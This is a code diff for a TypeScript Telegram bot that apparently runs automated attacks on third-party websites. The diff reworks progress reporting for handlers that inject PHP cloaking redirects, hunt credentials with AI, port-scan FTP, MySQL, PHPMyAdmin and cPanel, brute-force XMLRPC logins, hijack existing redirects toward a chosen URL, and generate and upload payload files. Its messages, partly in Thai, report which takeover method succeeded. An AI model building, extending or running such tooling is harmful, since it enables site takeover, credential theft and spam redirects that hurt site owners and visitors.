-        msg += `\uD83D\uDCA5 Method: ${injectionResult.method}\n`;
-        msg += `\uD83D\uDCC4 File: ${injectionResult.injectedFile || "N/A"}\n`;
-        msg += `\uD83D\uDD17 Redirect: ${redirectUrl.substring(0, 50)}\n`;
-        msg += `\uD83C\uDF10 External JS: ${(injectionResult.externalJsUrl || "").substring(0, 60)}\n`;
-        if (injectionResult.verificationResult) {
-          const v = injectionResult.verificationResult;
-          msg += `\n\uD83D\uDD0D Verification:\n`;
-          msg += `  Cloaking: ${v.cloakingWorks ? "\u2705" : "\u274C"}\n`;
-          msg += `  Redirect: ${v.redirectWorks ? "\u2705" : "\u274C"}\n`;
-          msg += `  Normal site: ${v.normalSiteWorks ? "\u2705" : "\u274C"}\n`;
-        }
-        msg += `\n\u23F1 ${formatDuration(totalDuration)}`;
-        msg += `\n\n\uD83D\uDCA1 \u0E40\u0E1B\u0E25\u0E35\u0E48\u0E22\u0E19 redirect URL \u0E44\u0E14\u0E49\u0E17\u0E38\u0E01\u0E40\u0E21\u0E37\u0E48\u0E2D\u0E42\u0E14\u0E22\u0E44\u0E21\u0E48\u0E15\u0E49\u0E2D\u0E07\u0E41\u0E01\u0E49 PHP \u0E1A\u0E19\u0E40\u0E27\u0E47\u0E1A (\u0E41\u0E01\u0E49\u0E41\u0E04\u0E48 JS \u0E1A\u0E19 S3)`;
-        await sendTelegramReply(config, chatId, msg);
-      } else {
-        await sendTelegramReply(config, chatId,
-          `\uD83D\uDD14 PHP Cloaking Injection \u0E25\u0E49\u0E21\u0E40\u0E2B\u0E25\u0E27\n\n` +
-          `\u274C ${domain}\n` +
-          `\uD83D\uDCA5 Tried: ${injectionResult.errors.length} methods\n` +
-          `\u26A0\uFE0F ${injectionResult.errors.slice(0, 3).join("\n")}\n` +
-          `\u23F1 ${formatDuration(totalDuration)}\n\n` +
-          `\uD83D\uDCA1 \u0E15\u0E49\u0E2D\u0E07\u0E21\u0E35 admin access \u0E2B\u0E23\u0E37\u0E2D shell access \u0E01\u0E48\u0E2D\u0E19\u0E16\u0E36\u0E07\u0E08\u0E30 inject \u0E44\u0E14\u0E49`
-        );
+      // Send alternative suggestions on failure
+      if (!injectionResult.success) {
         await sendAlternativeAttackSuggestions(config, chatId, domain, "cloaking_inject", {
           errorMessage: injectionResult.errors.join("; "),
         });
       }
       
     } else if (method === "hijack_redirect") {
-      // Hijack Redirect Engine — 6 methods to take over existing redirects
-      await updateProgress("Starting Hijack Redirect Engine", "running");
+      // ═══ NARRATED HIJACK REDIRECT ═══
+      const narrator = new TelegramNarrator({
+        domain,
+        method: "hijack_redirect",
+        botToken: config.botToken,
+        chatId,
+        messageId: progressMsgId,
+      });
+      await narrator.init();
       const s1 = Date.now();
       
       // Step 1: Get redirect URL
+      await narrator.startPhase("recon", "🔍 เตรียมการโจมตี");
+      const stepUrl = await narrator.addStep("เลือก Redirect URL");
       const { pickRedirectUrl: pickRedUrl } = await import("./agentic-attack-engine");
       const hijackRedirectUrl = await pickRedUrl();
+      await narrator.updateStep(stepUrl, "done", `Redirect: ${hijackRedirectUrl.substring(0, 50)}`, Date.now() - s1);
       timings.push({ step: "Redirect URL selected", ms: Date.now() - s1, ok: true });
       stepIndex++;
       
       // Step 2: AI Credential Hunter
-      await updateProgress("🔑 AI Credential Hunter กำลังค้นหา credentials...", "running");
+      await narrator.startPhase("credential", "🔑 AI Credential Hunter");
+      const stepCred = await narrator.addStep("ค้นหา credentials ด้วย AI");
       const s1b = Date.now();
       let huntedCreds: Array<{ username: string; password: string }> = [];
       let credHuntSummary = "";
@@ -4095,21 +4226,32 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           maxDurationMs: 45_000,
           onProgress: async (phase, detail) => {
             try {
-              await editTelegramMessage(config, chatId, progressMsgId,
-                `🔑 Credential Hunter: ${domain}\n\n${detail}`);
+              await narrator.addStep(`🔑 ${detail.substring(0, 60)}`);
             } catch { /* ignore */ }
           },
         });
         huntedCreds = huntResult.credentials.slice(0, 100).map(c => ({ username: c.username, password: c.password }));
-        credHuntSummary = `🔑 CredHunter: ${huntResult.credentials.length} creds found (${huntResult.enumeratedUsers.length} users, ${huntResult.techniques.filter(t => t.status === "success").length}/${huntResult.techniques.length} techniques)`;
+        credHuntSummary = `🔑 CredHunter: ${huntResult.credentials.length} creds found`;
+        
+        await narrator.updateStep(stepCred, huntResult.credentials.length > 0 ? "done" : "failed",
+          generateCredentialAnalysis({
+            usersFound: huntResult.enumeratedUsers,
+            techniquesUsed: huntResult.techniques.length,
+            techniquesSucceeded: huntResult.techniques.filter(t => t.status === "success").length,
+            credentialsFound: huntResult.credentials.length,
+          }),
+          Date.now() - s1b
+        );
         timings.push({ step: credHuntSummary, ms: Date.now() - s1b, ok: huntResult.credentials.length > 0 });
       } catch (credErr: any) {
+        await narrator.updateStep(stepCred, "failed", `CredHunter error: ${credErr.message}`, Date.now() - s1b);
         timings.push({ step: `CredHunter: ${credErr.message}`, ms: Date.now() - s1b, ok: false });
       }
       stepIndex++;
       
-      // Step 3-8: Execute hijack redirect with all 6 methods + AI credentials
-      await updateProgress("Port scanning + trying 6 methods...", "running");
+      // Step 3: Port scan + hijack methods
+      await narrator.startPhase("hijack", "🔓 Hijack Redirect Engine");
+      const stepScan = await narrator.addStep("🔌 สแกนพอร์ต (FTP, MySQL, PHPMyAdmin, cPanel)");
       const s2 = Date.now();
       const { executeHijackRedirect } = await import("./hijack-redirect-engine");
       
@@ -4120,37 +4262,75 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       }, async (phase, detail, methodIndex, totalMethods) => {
         try {
           attackEntry.lastUpdate = detail;
-          const pct = Math.floor(((stepIndex + methodIndex) / 8) * 100);
-          const bar = Array.from({ length: 10 }, (_, i) => i < Math.floor(pct / 10) ? "\u2588" : "\u2591").join("");
-          await editTelegramMessage(config, chatId, progressMsgId,
-            `\uD83D\uDD13 Hijack Redirect: ${domain}\n\n[${bar}] ${pct}%\n\u0E27\u0E34\u0E18\u0E35: ${phase}\n${detail}`);
-        } catch { /* ignore progress update errors */ }
+          const methodLabel: Record<string, string> = {
+            xmlrpc_brute: "🔨 XMLRPC Brute Force",
+            rest_api_editor: "📝 REST API Theme Editor",
+            phpmyadmin: "🗄 PHPMyAdmin",
+            mysql_direct: "💾 MySQL Direct",
+            ftp_access: "📁 FTP Access",
+            cpanel_filemanager: "🖥 cPanel File Manager",
+          };
+          await narrator.addStep(`${methodLabel[phase] || phase}: ${detail.substring(0, 50)}`);
+        } catch { /* ignore */ }
       });
       
       const hijackMs = Date.now() - s2;
-      stepIndex += 6;
+      
+      // Update port scan step
+      const p = hijackResult.portsOpen;
+      await narrator.updateStep(stepScan, "done",
+        generateReconAnalysis({
+          openPorts: [
+            ...(p.ftp ? [21] : []),
+            ...(p.mysql ? [3306] : []),
+            ...(p.pma ? [8080] : []),
+            ...(p.cpanel ? [2083] : []),
+          ],
+        }),
+        hijackMs
+      );
       
       // Log each method result
       for (const mr of hijackResult.methodResults) {
+        await narrator.addStep(`${mr.success ? "✅" : "❌"} ${mr.methodLabel}`);
+        await narrator.completeLastStep(mr.success ? "done" : "failed",
+          generateHijackAnalysis({
+            method: mr.methodLabel,
+            success: mr.success,
+            detail: mr.detail.substring(0, 80),
+          }),
+          mr.durationMs
+        );
         timings.push({
-          step: `${mr.methodLabel}: ${mr.success ? "\u2705" : "\u274C"} ${mr.detail.substring(0, 80)}`,
+          step: `${mr.methodLabel}: ${mr.success ? "✅" : "❌"} ${mr.detail.substring(0, 80)}`,
           ms: mr.durationMs,
           ok: mr.success,
         });
       }
+      stepIndex += 6;
       
-      // Port scan results
-      const p = hijackResult.portsOpen;
-      timings.push({
-        step: `Ports: FTP=${p.ftp ? "\u2705" : "\u274C"} MySQL=${p.mysql ? "\u2705" : "\u274C"} PMA=${p.pma ? "\u2705" : "\u274C"} cPanel=${p.cpanel ? "\u2705" : "\u274C"}`,
-        ms: 0,
-        ok: true,
-      });
+      // Analysis
+      if (hijackResult.success) {
+        await narrator.addAnalysis(
+          `Hijack สำเร็จด้วย ${hijackResult.winningMethod}! ` +
+          `เว็บจะ redirect ไปยัง ${hijackRedirectUrl}`
+        );
+      } else {
+        await narrator.addAnalysis(
+          `ลองแล้ว ${hijackResult.methodResults.length} วิธี ไม่สำเร็จ — ` +
+          `พอร์ตที่เปิด: FTP=${p.ftp} MySQL=${p.mysql} PMA=${p.pma} cPanel=${p.cpanel}`
+        );
+      }
       
-      await updateProgress("Done", hijackResult.success ? "done" : "failed");
+      // Complete
+      const totalDuration = Date.now() - s1;
+      await narrator.complete(hijackResult.success,
+        hijackResult.success
+          ? `Hijack สำเร็จด้วย ${hijackResult.winningMethod} — redirect ไป ${hijackRedirectUrl}`
+          : `ลอง ${hijackResult.methodResults.length} วิธี ไม่สำเร็จ`
+      );
       
       // Save attack log
-      const totalDuration = Date.now() - s1;
       await saveAttackLog({
         targetDomain: domain,
         method: "hijack_redirect",
@@ -4161,52 +4341,34 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         errorMessage: !hijackResult.success ? hijackResult.errors.slice(0, 3).join("; ") : undefined,
       });
       
-      // Send completion notification
-      if (hijackResult.success) {
-        let msg = `\uD83D\uDD14 Hijack Redirect \u0E2A\u0E33\u0E40\u0E23\u0E47\u0E08!\n\n`;
-        msg += `\u2705 ${domain}\n`;
-        msg += `\uD83D\uDCA5 Method: ${hijackResult.winningMethod}\n`;
-        msg += `\uD83D\uDD17 New Redirect: ${hijackRedirectUrl.substring(0, 50)}\n`;
-        if (hijackResult.originalRedirectUrl) {
-          msg += `\uD83D\uDD04 Old Redirect: ${hijackResult.originalRedirectUrl.substring(0, 50)}\n`;
-        }
-        if (credHuntSummary) msg += `${credHuntSummary}\n`;
-        msg += `\n\uD83D\uDCCA Methods tried:\n`;
-        for (const mr of hijackResult.methodResults) {
-          msg += `  ${mr.success ? "\u2705" : "\u274C"} ${mr.methodLabel} (${formatDuration(mr.durationMs)})\n`;
-        }
-        msg += `\n\u23F1 ${formatDuration(totalDuration)}`;
-        await sendTelegramReply(config, chatId, msg);
-      } else {
-        let msg = `\uD83D\uDD14 Hijack Redirect \u0E25\u0E49\u0E21\u0E40\u0E2B\u0E25\u0E27\n\n`;
-        msg += `\u274C ${domain}\n`;
-        if (hijackResult.redirectPattern) {
-          msg += `\uD83D\uDD0D Current redirect: ${hijackResult.redirectPattern.type} \u2192 ${hijackResult.redirectPattern.currentUrl || "unknown"}\n`;
-        }
-        msg += `\n\uD83D\uDCCA Methods tried:\n`;
-        for (const mr of hijackResult.methodResults) {
-          msg += `  ${mr.success ? "\u2705" : "\u274C"} ${mr.methodLabel}: ${mr.detail.substring(0, 60)}\n`;
-        }
-        msg += `\n\uD83D\uDD0C Open ports: FTP=${p.ftp} MySQL=${p.mysql} PMA=${p.pma} cPanel=${p.cpanel}\n`;
-        msg += `\u23F1 ${formatDuration(totalDuration)}`;
-        await sendTelegramReply(config, chatId, msg);
+      // Send alternative suggestions on failure
+      if (!hijackResult.success) {
         await sendAlternativeAttackSuggestions(config, chatId, domain, "hijack_redirect", {
           errorMessage: hijackResult.errors.join("; "),
         });
       }
       
     } else if (method === "advanced_all" || method === "deploy_advanced_all" || method.startsWith("advanced_") || method.startsWith("deploy_advanced_")) {
-      // Advanced attack — generate payloads + deploy
+      // ═══ NARRATED ADVANCED ATTACK ═══
       console.log(`[TelegramAI] Entering advanced handler: method=${method}, isDeployMode=${method.startsWith("deploy_")}`);
       const isDeployMode = method.startsWith("deploy_");
       const technique = method.replace("deploy_advanced_", "").replace("advanced_", "") || "all";
       const techLabel = technique === "all" ? "รวม 5 เทคนิค" : technique;
       const modeLabel = isDeployMode ? "Deploy Advanced" : "Advanced Attack";
       
-      await updateProgress(`Starting ${modeLabel}: ${techLabel}`, "running");
+      const narrator = new TelegramNarrator({
+        domain,
+        method: modeLabel,
+        botToken: config.botToken,
+        chatId,
+        messageId: progressMsgId,
+      });
+      await narrator.init();
       const s1 = Date.now();
       
-      // Get redirect URL
+      // Step 1: Get redirect URL
+      await narrator.startPhase("recon", "🔍 เตรียมการโจมตี");
+      const stepUrl = await narrator.addStep("เลือก Redirect URL");
       let redirectUrl: string;
       try {
         const { pickRedirectUrl } = await import("./agentic-attack-engine");
@@ -4214,12 +4376,14 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       } catch {
         redirectUrl = "https://hkt956.org/";
       }
+      await narrator.updateStep(stepUrl, "done", `Redirect: ${redirectUrl.substring(0, 50)}`, Date.now() - s1);
       timings.push({ step: "Redirect URL selected", ms: Date.now() - s1, ok: true });
       stepIndex++;
       
       if (isDeployMode) {
         // Deploy mode: generate + deploy + verify
-        await updateProgress("Phase 1: Generating payloads", "running");
+        await narrator.startPhase("exploit", `🚀 ${modeLabel}: ${techLabel}`);
+        const stepGen = await narrator.addStep("สร้าง payloads");
         const s2 = Date.now();
         
         const { generateAndDeployAdvanced } = await import("./advanced-deploy-engine");
@@ -4228,20 +4392,30 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           userId: 1,
           onProgress: async (event) => {
             try {
-              const bar = Array.from({ length: 10 }, (_, i) => i < Math.floor(event.progress / 10) ? "█" : "░").join("");
-              await editTelegramMessage(config, chatId, progressMsgId,
-                `🚀 ${modeLabel}: ${techLabel} บน ${domain}\n\n[${bar}] ${event.progress}%\n${event.detail}`);
-            } catch { /* ignore progress update errors */ }
+              await narrator.addStep(event.detail.substring(0, 60));
+            } catch { /* ignore */ }
           },
         });
         
         const deployMs = Date.now() - s2;
+        await narrator.updateStep(stepGen, generation.totalPayloads > 0 ? "done" : "failed",
+          `สร้าง ${generation.totalPayloads} payloads, ${generation.totalFiles} ไฟล์`,
+          deployMs / 2
+        );
         timings.push({
           step: `Generated: ${generation.totalPayloads} payloads, ${generation.totalFiles} files`,
           ms: deployMs / 2,
           ok: generation.totalPayloads > 0,
         });
         stepIndex++;
+        
+        // Deploy step
+        await narrator.startPhase("upload", "📤 Deploy ไฟล์ไปเว็บ");
+        const stepDeploy = await narrator.addStep("อัปโหลดและตรวจสอบ");
+        await narrator.updateStep(stepDeploy, deployment.deployedFiles > 0 ? "done" : "failed",
+          `Deployed: ${deployment.deployedFiles}/${deployment.totalFiles} | Verified: ${deployment.verifiedFiles}`,
+          deployMs / 2
+        );
         timings.push({
           step: `Deployed: ${deployment.deployedFiles}/${deployment.totalFiles}, Verified: ${deployment.verifiedFiles}`,
           ms: deployMs / 2,
@@ -4250,7 +4424,13 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         stepIndex++;
         
         const success = deployment.deployedFiles > 0;
-        await updateProgress("Done", success ? "done" : "failed");
+        
+        // Complete
+        await narrator.complete(success,
+          success
+            ? `Deploy สำเร็จ ${deployment.deployedFiles} ไฟล์, ยืนยัน ${deployment.verifiedFiles} ไฟล์`
+            : `Deploy ไม่สำเร็จ — เว็บอาจมี WAF/firewall ป้องกัน`
+        );
         
         // Save attack log
         await saveAttackLog({
@@ -4263,32 +4443,16 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           aiReasoning: `${modeLabel}: ${generation.totalPayloads} payloads, ${deployment.deployedFiles} deployed, ${deployment.verifiedFiles} verified`,
         });
         
-        // Send NEW completion notification
-        if (success) {
-          let msg = `🔔 ${modeLabel} เสร็จแล้ว!\n\n`;
-          msg += `✅ ${domain}\n`;
-          msg += `📦 Payloads: ${generation.totalPayloads} | Deployed: ${deployment.deployedFiles} | Verified: ${deployment.verifiedFiles}\n`;
-          if (deployment.deployedUrls.length > 0) {
-            msg += `🔗 ${deployment.deployedUrls[0].url.substring(0, 60)}\n`;
-          }
-          msg += `⏱ ${formatDuration(deployMs)}`;
-          await sendTelegramReply(config, chatId, msg);
-        } else {
-          await sendTelegramReply(config, chatId,
-            `🔔 ${modeLabel} เสร็จแล้ว (deploy ไม่สำเร็จ)\n\n` +
-            `❌ ${domain}\n` +
-            `📦 Payloads: ${generation.totalPayloads} | Deploy: 0\n` +
-            `⚠️ เว็บอาจมี WAF/firewall ป้องกัน\n` +
-            `⏱ ${formatDuration(deployMs)}`
-          );
+        if (!success) {
           await sendAlternativeAttackSuggestions(config, chatId, domain, method, {
             errorMessage: `Deploy failed: 0/${deployment.totalFiles} files deployed`,
           });
         }
         
       } else {
-        // Generate-only mode: just create payloads (no deploy)
-        await updateProgress("Generating advanced payloads", "running");
+        // Generate-only mode with narration
+        await narrator.startPhase("exploit", `🚀 ${modeLabel}: ${techLabel}`);
+        const stepGen = await narrator.addStep("สร้าง advanced payloads");
         const s2 = Date.now();
         
         const { runAdvancedAttack } = await import("./advanced-attack-engine");
@@ -4300,6 +4464,11 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         
         const genMs = Date.now() - s2;
         const techSummaries = report.techniques.map(t => `${t.technique}: ${t.payloads.length} payloads`).join(", ");
+        
+        await narrator.updateStep(stepGen, report.totalPayloads > 0 ? "done" : "failed",
+          `สร้าง ${report.totalPayloads} payloads (${techSummaries})`,
+          genMs
+        );
         timings.push({
           step: `Generated: ${report.totalPayloads} payloads (${techSummaries})`,
           ms: genMs,
@@ -4307,8 +4476,24 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         });
         stepIndex++;
         
+        // Add technique breakdown
+        for (const t of report.techniques) {
+          await narrator.addStep(`🔧 ${t.technique}: ${t.payloads.length} payloads`);
+          await narrator.completeLastStep(t.payloads.length > 0 ? "done" : "failed");
+        }
+        
+        if (report.aiAnalysis) {
+          await narrator.addAnalysis(`🤖 AI: ${report.aiAnalysis.substring(0, 120)}`);
+        }
+        
         const success = report.totalPayloads > 0;
-        await updateProgress("Done", success ? "done" : "failed");
+        
+        // Complete
+        await narrator.complete(success,
+          success
+            ? `สร้าง ${report.totalPayloads} payloads จาก ${report.techniques.length} เทคนิค`
+            : `สร้าง payloads ไม่สำเร็จ`
+        );
         
         // Save attack log
         await saveAttackLog({
@@ -4319,17 +4504,6 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           redirectUrl,
           aiReasoning: `Advanced Attack: ${report.totalPayloads} payloads, ${report.totalFiles} files. ${report.aiAnalysis || ""}`,
         });
-        
-        // Send NEW completion notification
-        let msg = `🔔 Advanced Attack เสร็จแล้ว!\n\n`;
-        msg += `${success ? "✅" : "❌"} ${domain}\n`;
-        msg += `📦 Payloads: ${report.totalPayloads} | Files: ${report.totalFiles}\n`;
-        msg += `🔧 Techniques: ${report.techniques.map(t => t.technique).join(", ")}\n`;
-        if (report.aiAnalysis) {
-          msg += `🤖 ${report.aiAnalysis.substring(0, 100)}\n`;
-        }
-        msg += `⏱ ${formatDuration(genMs)}`;
-        await sendTelegramReply(config, chatId, msg);
         
         if (!success) {
           await sendAlternativeAttackSuggestions(config, chatId, domain, method, {
